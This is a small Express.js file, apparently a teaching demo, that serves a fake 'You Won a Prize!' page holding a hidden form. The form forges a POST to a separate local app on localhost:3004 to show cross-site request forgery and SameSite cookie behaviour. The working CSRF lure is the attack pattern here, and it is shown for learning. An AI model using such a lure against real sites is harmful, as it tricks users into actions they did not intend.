import express from "express";

const app = express();
const PORT = 3005;

app.get("/", (_, res) => {
  // We serve the 'attack' page from a different origin (localhost:3005)
  res.send(`
    <html>
      <body style="font-family: sans-serif; text-align: center; padding: 50px; background: #fee2e2;">
        <h1 style="color: #991b1b;">You Won a Prize! 🎁</h1>
        <p>Click below to claim your reward.</p>

        <form action="http://localhost:3004/tasks" method="POST">
          <input type="hidden" name="title" value="ATTACKER CREATED THIS TASK!">
          <button type="submit" style="padding: 20px; background: #ef4444; color: white; border: none; cursor: pointer; border-radius: 8px;">
            CLAIM PRIZE NOW
          </button>
        </form>

        <p style="font-size: 12px; margin-top: 50px;">
          (This form sends a POST to localhost:3004. If SameSite is 'none', it works!)
        </p>
      </body>
    </html>
  `);
});

app.listen(PORT, () =>
  console.log(`💀 Malicious Site: http://localhost:${PORT}`),
);
